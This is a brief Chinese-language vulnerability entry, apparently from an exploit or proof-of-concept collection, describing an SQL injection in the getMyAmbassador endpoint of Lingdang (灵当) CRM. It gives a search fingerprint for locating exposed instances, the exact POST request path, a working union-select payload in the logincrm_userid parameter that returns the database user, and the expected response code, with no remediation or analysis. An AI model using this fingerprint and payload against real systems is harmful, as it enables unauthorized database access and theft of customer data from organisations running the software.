# 灵当CRMgetMyAmbassador存在SQL注入漏洞

灵当 ｜ SQL注入 ｜ —
- **指纹**：`body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
- **请求**：`POST /crm/WeiXinApp/marketing/index.php?module=Ambassador&action=getMyAmbassador HTTP/1.1`

**Payload**
```
logincrm_userid=-1 union select user(),2,3#
```
- **响应特征**：200